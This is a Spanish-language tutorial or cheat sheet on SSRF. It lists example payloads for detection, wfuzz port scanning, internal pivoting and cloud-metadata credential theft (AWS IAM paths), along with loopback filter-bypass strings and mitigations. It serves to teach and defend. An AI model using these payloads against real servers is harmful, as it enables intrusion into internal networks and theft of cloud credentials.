# Server-Side Request Forgery (SSRF)

SSRF es una vulnerabilidad que permite al atacante forzar al servidor web a realizar peticiones HTTP en su nombre. El servidor actúa como proxy involuntario, permitiendo acceder a recursos internos que no son accesibles desde el exterior.

---

## ¿Por qué es peligroso?

Los servidores web suelen tener acceso a:
- Puertos y servicios internos no expuestos al exterior
- Redes internas (intranets, bases de datos, otros microservicios)
- Metadatos de instancias cloud (AWS, GCP, Azure) que pueden contener credenciales

---

## Detección

Si una aplicación acepta una URL como parámetro de entrada (para cargar una imagen, previsualizar un enlace, importar datos, etc.), probar apuntando al propio servidor:

```
http://target.com/utility.php?url=http://127.0.0.1
http://target.com/utility.php?url=http://localhost
```

Si la respuesta cambia o devuelve contenido interno, hay SSRF.

---

## Enumeración de puertos internos

Una vez confirmado el SSRF, descubrir qué servicios internos están activos en `127.0.0.1`:

**Manual:**
```
http://target.com/utility.php?url=http://127.0.0.1:22
http://target.com/utility.php?url=http://127.0.0.1:80
http://target.com/utility.php?url=http://127.0.0.1:8080
http://target.com/utility.php?url=http://127.0.0.1:3306
```

**Automatizado con wfuzz:**
```bash
wfuzz -c -t 200 --hl=3 -z range,1-65535 \
  "http://target.com/utility.php?url=http://127.0.0.1:FUZZ"
```

Los puertos que devuelvan una respuesta diferente (distinto número de líneas o tamaño) están activos.

---

## Acceso a redes internas (pivoting via SSRF)

Si el servidor víctima está conectado a una red interna con otras máquinas, se puede usar el SSRF para alcanzarlas desde el exterior:

```
http://target.com/utility.php?url=http://10.10.0.3:8080/admin
http://target.com/utility.php?url=http://192.168.1.50:5000/api/users
```

Esto convierte el servidor comprometido en un proxy hacia toda su red interna.

---

## Robo de credenciales en cloud (AWS Metadata)

En instancias de AWS EC2 mal configuradas, el endpoint de metadatos expone credenciales temporales de IAM:

```
http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/
http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Equivalentes en otros proveedores:
- GCP: `http://metadata.google.internal/computeMetadata/v1/`
- Azure: `http://169.254.169.254/metadata/instance`

---

## Bypass de filtros comunes

Si la aplicación bloquea `127.0.0.1` o `localhost`:

```
http://0.0.0.0
http://0
http://[::1]                    # IPv6 loopback
http://127.1
http://127.0.1
http://2130706433               # 127.0.0.1 en decimal
http://0x7f000001               # 127.0.0.1 en hexadecimal
http://localtest.me             # Resuelve a 127.0.0.1
```

Si bloquea por palabras clave, usar redirecciones o resolución DNS propia.

---

## Diferencia SSRF vs CSRF

| Aspecto | SSRF | CSRF |
|---|---|---|
| Quién realiza la petición | El **servidor** web | El **navegador** de la víctima |
| Requiere engañar un usuario | No | Sí |
| Objetivo | Recursos internos del servidor | Acciones en nombre del usuario |
| Detección de origen | Más difícil (viene del propio server) | Cabecera `Referer`/`Origin` |

---

## Mitigaciones

- Validar y filtrar URLs de entrada con lista blanca de dominios/IPs permitidos
- Bloquear rangos de IPs privadas en las peticiones salientes del servidor (127.x, 10.x, 172.16-31.x, 192.168.x)
- Deshabilitar `allow_url_include` y restringir `allow_url_fopen` en PHP
- Usar un proxy de salida con filtrado para las peticiones del servidor
- En cloud: deshabilitar el servicio de metadatos IMDSv1 y migrar a IMDSv2 (requiere token)
